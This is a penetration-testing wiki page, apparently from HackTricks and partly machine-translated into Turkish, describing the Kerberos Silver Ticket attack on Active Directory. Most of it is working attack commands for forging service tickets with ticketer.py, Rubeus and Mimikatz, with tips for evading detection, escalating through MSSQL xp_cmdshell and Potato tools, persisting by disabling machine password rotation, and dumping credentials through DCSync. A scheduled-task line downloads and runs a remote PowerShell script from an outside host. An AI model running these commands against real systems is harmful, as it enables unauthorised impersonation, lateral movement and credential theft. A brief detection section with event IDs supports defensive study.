# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

### Modern Kerberos changes (AES-only domains)

- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES session keys** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Always extract **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) for the target service account.
- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` minutes) to avoid detection by abnormal lifetimes.

For ticket crafting, different tools are employed based on the operating system:

### On Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows'ta
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS servisi, hedefin dosya sistemine erişmek için yaygın bir hedef olarak öne çıkar, ancak HOST ve RPCSS gibi diğer servisler de görevler ve WMI sorguları için suistimal edilebilir.

### Örnek: MSSQL servisi (MSSQLSvc) + Potato to SYSTEM

Eğer bir SQL servis hesabının (ör. sqlsvc) NTLM hash'ine (veya AES key'ine) sahipseniz MSSQL SPN için bir TGS sahteleyebilir ve SQL servisine karşı herhangi bir kullanıcıyı taklit edebilirsiniz. Oradan, xp_cmdshell'i etkinleştirerek SQL servis hesabı olarak komutlar çalıştırabilirsiniz. Eğer o token SeImpersonatePrivilege'e sahipse, SYSTEM'e yükselmek için Potato tekniğini zincirleyebilirsiniz.
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Eğer ortaya çıkan bağlam SeImpersonatePrivilege'e sahipse (çoğunlukla service accounts için doğrudur), SYSTEM elde etmek için bir Potato varyantı kullanın:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
More details on abusing MSSQL and enabling xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques overview:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Kullanılabilir Hizmetler

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>İşletim sistemine bağlı olarak ayrıca:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Bazı durumlarda sadece WINRM isteyebilirsiniz</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Rubeus kullanarak bu ticket'ların tamamını şu parametre ile isteyebilirsiniz:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event ID'leri

- 4624: Hesap Girişi
- 4634: Hesap Oturumu Kapatma
- 4672: Yönetici Girişi
- Aynı istemci/hizmet için DC üzerinde önce gelen 4768/4769 olmaması, sahte bir TGS'nin doğrudan hizmete sunulduğuna dair yaygın bir göstergedir.
- Anormal derecede uzun ticket ömrü veya beklenmeyen şifreleme türü (etki alanı AES'i zorunlu kıldığında RC4 gibi) ayrıca 4769/4624 verilerinde göze çarpar.

## Kalıcılık

Makinelerin parolalarını her 30 günde bir döndürmesini önlemek için `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` değerini ayarlayın veya `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` değerini makinelerin parolasının döndürülmesi gereken süreyi gösterecek şekilde 30 günden daha büyük bir değere ayarlayabilirsiniz.

## Abusing Service tickets

Aşağıdaki örneklerde ticket'ın yönetici hesabını taklit ederek alındığını varsayalım.

### CIFS

Bu ticket ile **SMB** aracılığıyla `C$` ve `ADMIN$` klasörlerine (eğer açıklar ise) erişebilecek ve uzak dosya sisteminin bir bölümüne şu şekilde dosya kopyalayabileceksiniz:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ayrıca **psexec** kullanarak hedef host içinde bir shell elde edebilir veya istediğiniz komutları çalıştırabilirsiniz:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Bu izin ile uzak bilgisayarlarda zamanlanmış görevler oluşturabilir ve istediğiniz komutları çalıştırabilirsiniz:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Bu tickets'lerle hedef sistemde **WMI** çalıştırabilirsiniz:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Aşağıdaki sayfada **wmiexec hakkında daha fazla bilgi** bulabilirsiniz:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Bir bilgisayarda winrm erişimi ile **ona erişebilir** ve hatta bir PowerShell alabilirsiniz:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Aşağıdaki sayfayı inceleyerek **winrm kullanarak uzak bir hosta bağlanmanın daha fazla yolunu** öğrenin:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Uzak bilgisayara erişmek için **winrm'in etkin ve dinlemede olması gerektiğini** unutmayın.

### LDAP

Bu ayrıcalıkla **DCSync** kullanarak DC veritabanını dump edebilirsiniz:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync hakkında daha fazla bilgi edinin** aşağıdaki sayfada:


{{#ref}}
dcsync.md
{{#endref}}


## Referanslar

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
